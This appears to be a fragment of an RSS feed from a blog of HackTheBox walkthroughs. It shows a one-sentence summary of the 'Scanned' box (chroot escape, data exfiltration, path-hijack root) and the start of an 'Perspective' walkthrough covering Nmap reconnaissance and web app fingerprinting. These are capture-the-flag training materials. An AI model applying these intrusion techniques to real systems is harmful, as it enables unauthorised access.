 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/FoQuNsCyQz0?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;h3 id="key-exploitation-steps-and-techniques-chronological-order"&gt;Key Exploitation Steps and Techniques (Chronological Order)&lt;/h3&gt;
&lt;p&gt;The transcript describes a walkthrough for exploiting the &amp;ldquo;Scanned&amp;rdquo; box on HackTheBox, focusing on escaping a chroot jail in a malware sandbox application, exfiltrating data, gaining user access, and escalating to root via path hijacking. Below is a chronological extraction of the key steps and techniques, based on the narrative:&lt;/p&gt;</description></item><item><title>Perspective HTB - Insane Windows Box Walkthrough</title><link>https://malayamanas.github.io/posts/perspective-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 05:45:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/perspective-htb-walkthrough/</guid><description>&lt;h1 id="perspective-htb---insane-windows-box-walkthrough"&gt;Perspective HTB - Insane Windows Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/tmK0GIvnq6s?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Initial Reconnaissance&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Perform Nmap scan on the target IP ([TARGET-IP]) to identify open ports: SSH (22) and HTTP (80) running IIS.&lt;/li&gt;
&lt;li&gt;Access the web app on port 80, which redirects to perspective.htb (add to /etc/hosts).&lt;/li&gt;
&lt;li&gt;Identify the web app as an ASP.NET application by testing file extensions (e.g., .aspx gives different 404 error).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;User Registration and Login&lt;/strong&gt;:&lt;/p&gt;</description></item></channel></rss>